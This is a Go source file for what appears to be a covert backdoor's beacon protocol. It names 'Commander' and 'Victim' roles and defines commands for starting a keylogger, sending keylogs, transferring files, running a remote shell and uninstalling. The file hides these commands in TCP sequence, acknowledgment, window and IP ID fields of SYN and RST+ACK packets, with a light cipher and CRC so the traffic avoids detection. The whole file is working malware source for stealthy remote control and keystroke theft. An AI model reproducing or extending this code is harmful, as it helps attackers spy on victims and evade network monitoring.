package beacon 

import (
	"errors"
    "math/rand"
    "context"
    "fmt"
)

type CommanderBeaconCallback func(BeaconStruct, BeaconStruct, RouteStruct, UserSelection, context.Context) 
type VictimBeaconCallback func(BeaconStruct, BeaconStruct, RouteStruct, context.Context)
 
const (
    // Visiable Options 
    StartInodeWatchCode     uint8 = 0
    StartKeyLoggerCode      uint8 = 1 
    UninstallCode           uint8 = 2
    DiscCode                uint8 = 3
    TransferKeylogCode      uint8 = 4
    SendFileCode            uint8 = 5
    RecvFileCode            uint8 = 6
    RunShellCode            uint8 = 7
    RollbackCode            uint8 = 8
    
    // Hiden options 
    CrptdPktCode            uint8 = 9 
    InvalidPktCode          uint8 = 10 
    //IdleConnCode            uint8 = 11 

    MinCode         uint8 = 0
    MaxCode         uint8 = 11
    MaxVisibleCode  uint8 = 8
)

var CodeStrToCodeNum = map[uint8]string{
    StartInodeWatchCode: "StartInodeWatchCode",  
    StartKeyLoggerCode: "StartKeyLoggerCode",      
    UninstallCode: "UninstallCode",          
    DiscCode: "DiscCode",              
    TransferKeylogCode: "TransferKeylogCode",      
    SendFileCode: "SendFileCode",           
    RecvFileCode: "RecvFileCode",        
    RunShellCode: "RunShellCode",          
    CrptdPktCode: "CrptdPktCode",         
    InvalidPktCode: "InvalidPktCode",         
    //IdleConnCode: "IdleConnCode",          
    RollbackCode: "RollbackCode",              
}

type BeaconStruct struct{
	Type 		uint8  // 4 bits
    Options     uint16 // 12 bits 
	Data 		uint16 // 16 bits
    IsSYN 		bool   // Implies it is either SYN or RST+ACK
} 

type StenoFieldsStruct struct{
    CRC 				uint16 	// TCP.Window 
    EncryptedSeqNum 	uint32 	// TCP.Seq
    Key				 	uint16  // IPv4.Id
    AckNum 				uint32 	// TCP.Ack
    IsSYN 				bool 	
}

func crc16ccitt(v uint32) uint16 {
    var crc uint16 = 0xFFFF
    for shift := 24; shift >= 0; shift -= 8 {
        b := byte(v >> shift)
        crc ^= uint16(b) << 8
        for i := 0; i < 8; i++ {
            if crc&0x8000 != 0 {
                crc = (crc << 1) ^ 0x1021
            } else {
                crc <<= 1
            }
        }
    }
    return crc
}

func PRN(x uint16) uint32 {
    v := uint32(x)
    v ^= v << 11
    v ^= v >> 7
    v *= 0x045d9f3b
    v ^= v >> 16
    v *= 0x119de1f3
    v ^= v << 3
    v ^= v >> 13
    v ^= v << 9
    return v
}

func makeStenoFieldsSYN(beacon *BeaconStruct) StenoFieldsStruct{
    key := uint16(rand.Intn(Max16BitNum) + 1)
    plain := (uint32(beacon.Type) << 28) | (uint32(beacon.Options) << 16) | uint32(beacon.Data)
	cipher := PRN(key) ^ plain 
    crc := crc16ccitt(cipher)
    return StenoFieldsStruct{
        CRC: crc,
        EncryptedSeqNum: cipher,
        Key: key,
        AckNum: 0,
        IsSYN: true,
    }
}

func MakeStenoFieldsRSTACK(beacon *BeaconStruct, stenoFieldsSYN *StenoFieldsStruct) StenoFieldsStruct{  
    key := uint16(((uint32(stenoFieldsSYN.Key) + stenoFieldsSYN.EncryptedSeqNum)) % uint32(Max16BitNum + 1))
    plain := (uint32(beacon.Type) << 28) | (uint32(beacon.Options) << 16) | uint32(beacon.Data)
    cipher := PRN(key) ^ plain
    crc := crc16ccitt(cipher)
    return StenoFieldsStruct{
        CRC: crc,
        EncryptedSeqNum: cipher,
        Key: key,
        AckNum: stenoFieldsSYN.EncryptedSeqNum + 1,
        IsSYN: false,
    }
}

func parseStenoFieldsSYN(stenoFieldsSYN *StenoFieldsStruct) (BeaconStruct, error){
    var beacon BeaconStruct
    if !stenoFieldsSYN.IsSYN{
        return beacon, errors.New("SYN flag not set.")
    }
    if stenoFieldsSYN.CRC != crc16ccitt(stenoFieldsSYN.EncryptedSeqNum){
        return beacon, errors.New("Invalid CRC.")
    }
    plain := PRN(stenoFieldsSYN.Key) ^ stenoFieldsSYN.EncryptedSeqNum
    beacon.Type = uint8((plain >> 28)) & 0x0F 
    beacon.Options = uint16((plain >> 16)) & 0x0FFF 
    beacon.Data = uint16(plain) 
    beacon.IsSYN = true
    return beacon, nil
}

func parseStenoFieldsRSTACK(stenoFieldsRSTACK, stenoFieldsSYN *StenoFieldsStruct) (BeaconStruct, error){
    var beacon BeaconStruct
    if stenoFieldsRSTACK.IsSYN{
        return beacon, errors.New("Not RST+ACK.")
    }
    if stenoFieldsRSTACK.CRC != crc16ccitt(stenoFieldsRSTACK.EncryptedSeqNum){
        return beacon, errors.New("Invalid CRC.")
    }
    derivedKey := uint16(((uint32(stenoFieldsSYN.Key) + 
       stenoFieldsSYN.EncryptedSeqNum)) % uint32(Max16BitNum + 1))
    if stenoFieldsRSTACK.Key != derivedKey{
        return beacon, errors.New("Key corrupted.")
    }
    if stenoFieldsRSTACK.AckNum != stenoFieldsSYN.EncryptedSeqNum + 1{
        return beacon, errors.New("Ack corrupted.")
    }
    plain := PRN(stenoFieldsRSTACK.Key) ^ stenoFieldsRSTACK.EncryptedSeqNum
    beacon.Type = uint8((plain >> 28)) & 0x0F 
    beacon.Options = uint16((plain >> 16)) & 0x0FFF 
    beacon.Data = uint16(plain) 
    beacon.IsSYN = false
    return beacon, nil
}

func validateCode(code uint8) error{  
    if code > MaxCode{
        return fmt.Errorf("Invalid code [0-%d]", MaxCode)
    }
    return nil 
}

